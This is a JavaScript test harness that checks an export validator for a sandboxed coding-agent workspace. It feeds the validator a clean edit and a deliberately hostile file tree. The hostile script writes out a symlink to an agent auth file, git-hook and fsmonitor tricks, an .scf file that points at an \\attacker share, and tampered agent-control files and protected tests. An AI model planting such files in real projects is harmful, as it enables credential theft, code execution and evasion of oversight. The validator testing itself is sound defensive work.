import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { runInDistro } from "./wsl.mjs";

/**
 * C14 — the export validator exercised on REAL archives produced inside the environment (M05 §16, §23). A fictive project is
 * transferred in, changed the way a worker could change it, read back with the same tar command the runs use, and validated:
 *   clean round trip (UTF-8 names with diacritics and spaces, CRLF kept, an allowed binary, a deletion) → accepted and
 *   applied byte-exact to a copy; a later human edit → conflict, nothing written;
 *   hostile tree (links, hardlink, FIFO, protected/control/secret paths, Windows-invalid names, case collision, permission
 *   change, oversized and non-asset binary) → every case refused, nothing applied.
 * Returns check lines "C14x PASS|FAIL …". Fictive content only.
 */
const sha = (b) => crypto.createHash("sha256").update(b).digest("hex");
const PNG = Buffer.from("89504e470d0a1a0a0000000d4948445200000001000000010806000000", "hex");

function fixtureProject(dir) {
  const files = {
    "README.md": "# Proiect fictiv C14\n",
    "src/app.js": "export const value = 1;\n",
    "src/util.js": "export const util = () => 2;\n",
    "test/acceptance.test.mjs": "// test protejat (fictiv)\n",
    "AGENTS.md": "# instrucțiuni fictive\n",
    "crlf.txt": "linia 1\r\nlinia 2\r\n",
    "docs/notă veche.md": "conținut vechi\n",
    "img/logo.png": PNG,
    ".env": "FICTIV=1\n",
    "node_modules/dep/index.js": "module.exports = 1;\n",
  };
  for (const [rel, content] of Object.entries(files)) {
    const file = path.join(dir, ...rel.split("/"));
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, content);
  }
  return files;
}

const CLEAN_EDIT = `set -eu
# ifrim-c14:clean
cd "$1"
printf 'export const value = 2; // schimbat\\n' > src/app.js
mkdir -p "docs"
printf 'pagină nouă cu diacritice: ăîșțâ\\n' > "docs/pagină nouă.md"
printf 'linia 1\\r\\nlinia 2 modificată\\r\\n' > crlf.txt
printf '\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\x0dIHDR\\x00\\x00\\x00\\x02' > img/nou.png
rm -f "docs/notă veche.md"
mkdir -p node_modules/x && printf 'ignorat\\n' > node_modules/x/a.js
mkdir -p .ifrim-tmp && printf 'temp\\n' > .ifrim-tmp/t.txt
echo done
`;

const HOSTILE_EDIT = `set -u
# ifrim-c14:hostile
cd "$1"
ln -s /home/runner/.codex/auth.json evil-link
ln -s /etc evil-dir-link
ln src/util.js hard-link.js
mkfifo pipe-fifo
printf 'SECRET=fictiv\\n' > .env.local
printf '# modificat\\n' >> AGENTS.md
printf '// modificat\\n' >> test/acceptance.test.mjs
printf 'dublura\\n' > README.MD
printf 'x\\n' > con.txt
printf 'x\\n' > 'trail.'
printf 'x\\n' > 'a:b.txt'
printf 'x\\n' > 'back\\slash.txt'
printf 'MZ\\x00\\x00\\x01\\x02' > tool.exe
chmod +x src/util.js
mkdir -p .codex && printf 'model_provider = "x"\\n' > .codex/config.toml
head -c 17000000 /dev/zero > big.bin
mkdir -p 'GIT~1/hooks' && printf '#!/bin/sh\necho hook\n' > 'GIT~1/hooks/pre-commit'
mkdir -p sub/.GIT && printf '[core]\n\tfsmonitor = evil\n' > sub/.GIT/config
printf 'gitdir: ../evil\n' > src/.git
mkdir -p Node_Modules/.bin && printf 'echo x\n' > Node_Modules/.bin/x.cmd
printf '# instrucțiuni ascunse\n' > src/CLAUDE.md
mkdir -p .github/workflows && printf 'on: push\n' > .github/workflows/ci.yml
printf '[Shell]\nIconFile=\\\\attacker\\x\n' > x.scf
echo done
`;

const HOSTILE_EXPECT = [
  ["C14e", "evil-link", "tip symlink", "legătură simbolică spre un fișier"],
  ["C14f", "evil-dir-link", "tip symlink", "legătură simbolică spre un director"],
  ["C14g", "hard-link.js", "tip hardlink", "hardlink"],
  ["C14h", "pipe-fifo", "tip fifo", "FIFO"],
  ["C14i", ".env.local", "protejat", "fișier de tip secret nou (.env.local)"],
  ["C14j", "AGENTS.md", "control", "fișier de control al agenților"],
  ["C14k", "test/acceptance.test.mjs", "test de acceptanță protejat", "test de acceptanță protejat"],
  ["C14l", "README.MD", "majuscule", "coliziune de majuscule cu README.md"],
  ["C14m", "con.txt", "rezervat", "nume rezervat Windows"],
  ["C14n", "trail.", "punct sau spațiu", "nume terminat în punct"],
  ["C14o", "a:b.txt", "„:”", "„:” (alternate data stream)"],
  ["C14p", "back\\slash.txt", "backslash", "backslash în nume"],
  ["C14q", "tool.exe", "binar", "binar care nu e imagine/font/PDF"],
  ["C14r", "src/util.js", "bitului de execuție", "schimbare de permisiuni"],
  ["C14s", ".codex/config.toml", "control", "configurație de agent în workspace"],
  ["C14t", "big.bin", "peste limit", "fișier de 17 MB peste limită"],
  ["C14v", "GIT~1/hooks/pre-commit", "8.3", "nume scurt 8.3 (GIT~1 = .git) spre un hook"],
  ["C14w", "src/.git", "fișier de control", "fișier .git (redirect gitdir) într-un subfolder"],
  ["C14x", "src/CLAUDE.md", "fișier de control", "CLAUDE.md într-un subfolder (instrucțiuni pentru reviewer)"],
  ["C14y", ".github/workflows/ci.yml", "folder de control", "configurație CI (.github)"],
  ["C14z", "x.scf", "Windows îl execută", "fișier .scf (Explorer încarcă singur iconița de pe un share)"],
];

export async function exerciseExportValidator({ service, workDir }) {
  const lines = [];
  const add = (id, ok, what) => lines.push(`${id} ${ok ? "PASS" : "FAIL"} ${what}`);
  const tag = crypto.randomBytes(4).toString("hex");
  const base = path.join(workDir, `c14-${tag}`);
  const project = path.join(base, "project");
  const copy = path.join(base, "copy");
  fs.mkdirSync(project, { recursive: true });
  const files = fixtureProject(project);
  const protectedPaths = ["test/acceptance.test.mjs"];
  const ids = [`c14-clean-${tag}`, `c14-hostile-${tag}`];
  try {
    // Clean round trip.
    const clean = await service.prepareWorkspace({ id: ids[0], projectRoot: project, projectId: "c14", purpose: "attestation" });
    add("C14a", clean.stats.files === Object.keys(files).length - 2 && Object.values(clean.stats.skipped).reduce((a, b) => a + b, 0) === 2,
      `transfer: ${clean.stats.files} fișiere trimise, .env și node_modules excluse (${Object.entries(clean.stats.skipped).map(([k, v]) => `${v}× ${k}`).join("; ")})`);
    const edit = await runInDistro(service.config, service.env, { cwd: clean.repo, argv: ["/bin/bash", "-s", "--", clean.repo], input: Buffer.from(CLEAN_EDIT, "utf8") }).catch((e) => ({ code: -1, stderr: e.message, stdout: Buffer.alloc(0) }));
    if (edit.code !== 0) throw new Error(`modificarea curată a eșuat: ${edit.stderr}`);
    const v1 = await service.collectExport(ids[0], { protectedPaths });
    const want = { "src/app.js": "modified", "docs/pagină nouă.md": "added", "crlf.txt": "modified", "img/nou.png": "added", "docs/notă veche.md": "deleted" };
    const got = Object.fromEntries(v1.changes.map((c) => [c.path, c.status]));
    const sameSet = Object.keys(want).length === Object.keys(got).length && Object.entries(want).every(([k, s]) => got[k] === s);
    add("C14b", v1.ok && sameSet, `export curat acceptat: ${v1.changes.length} schimbări (${v1.changes.map((c) => `${c.status} ${c.path}`).join(", ")}); ${v1.stats.ignoredRegenerable} intrări regenerabile ignorate${v1.ok ? "" : `; refuzuri: ${v1.refused.map((r) => `${r.path}: ${r.reason}`).join("; ")}; probleme: ${v1.problems.join("; ")}`}`);
    fs.cpSync(project, copy, { recursive: true });
    if (v1.ok) {
      const applied = service.applyExport(ids[0], { projectRoot: copy, validation: v1 });
      const crlf = fs.readFileSync(path.join(copy, "crlf.txt"));
      const png = fs.readFileSync(path.join(copy, "img", "nou.png"));
      add("C14c", applied.applied === 5 && !applied.conflicts.length && crlf.includes(Buffer.from("modificată\r\n")) && png[0] === 0x89 && !fs.existsSync(path.join(copy, "docs", "notă veche.md"))
        && fs.existsSync(path.join(copy, "docs", "pagină nouă.md")), `aplicare octet cu octet: ${applied.applied} fișiere (CRLF păstrat, nume cu diacritice, binar PNG, ștergere)`);
      // A human edit after the transfer: the same export must now conflict and write nothing.
      fs.writeFileSync(path.join(project, "src", "app.js"), "export const value = 3; // editat de om\n");
      const before = sha(fs.readFileSync(path.join(project, "src", "app.js")));
      const conflict = service.applyExport(ids[0], { projectRoot: project, validation: v1 });
      add("C14d", conflict.conflicts.length > 0 && conflict.applied === 0 && sha(fs.readFileSync(path.join(project, "src", "app.js"))) === before && fs.existsSync(path.join(project, "docs", "notă veche.md")),
        `modificare umană după transfer → conflict (${conflict.conflicts.map((c) => c.path).join(", ")}), nimic suprascris`);
      fs.writeFileSync(path.join(project, "src", "app.js"), files["src/app.js"]);
    } else {
      add("C14c", false, "aplicarea nu a putut fi verificată (exportul curat a fost refuzat)");
      add("C14d", false, "conflictul nu a putut fi verificat");
    }
    await service.release(ids[0]);

    // Hostile tree.
    const hostile = await service.prepareWorkspace({ id: ids[1], projectRoot: project, projectId: "c14", purpose: "attestation" });
    const bad = await runInDistro(service.config, service.env, { cwd: hostile.repo, argv: ["/bin/bash", "-s", "--", hostile.repo], input: Buffer.from(HOSTILE_EDIT, "utf8") }).catch((e) => ({ code: -1, stderr: e.message, stdout: Buffer.alloc(0) }));
    if (bad.code !== 0) throw new Error(`arborele ostil nu a putut fi creat: ${bad.stderr}`);
    const snapshotBefore = hashTree(project);
    const v2 = await service.collectExport(ids[1], { protectedPaths });
    for (const [id, file, reason, label] of HOSTILE_EXPECT) {
      const hit = v2.refused.find((r) => r.path === file && r.reason.includes(reason));
      add(id, Boolean(hit) && !v2.ok, `${label}: ${hit ? `refuzat (${hit.reason})` : "NU a fost refuzat"}`);
    }
    let threw = false;
    try { service.applyExport(ids[1], { projectRoot: project, validation: v2 }); } catch { threw = true; }
    // Case variants of regenerable/git folders are never applied (ignored, counted), whatever their case.
    const neverApplied = ["sub/.GIT/config", "Node_Modules/.bin/x.cmd"].filter((p) => v2.changes.some((c) => c.path === p));
    add("C14u", !v2.ok && threw && hashTree(project) === snapshotBefore && !neverApplied.length,
      `exportul ostil e refuzat integral (${v2.refused.length} refuzuri), .GIT/ și Node_Modules/ nu ajung în schimbări${neverApplied.length ? ` (DAR: ${neverApplied.join(", ")})` : ""}, nimic nu se aplică în proiect`);
    await service.release(ids[1]);
  } catch (error) {
    lines.push(`C14z FAIL exercițiul nu s-a terminat: ${String(error.message).slice(0, 240)}`);
    for (const id of ids) await service.release(id).catch(() => {});
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
  return lines;
}

function hashTree(dir) {
  const h = crypto.createHash("sha256");
  const walk = (d, rel = "") => {
    for (const e of fs.readdirSync(d, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      if (e.isDirectory()) walk(path.join(d, e.name), r);
      else { h.update(r); h.update(fs.readFileSync(path.join(d, e.name))); }
    }
  };
  walk(dir);
  return h.digest("hex");
}
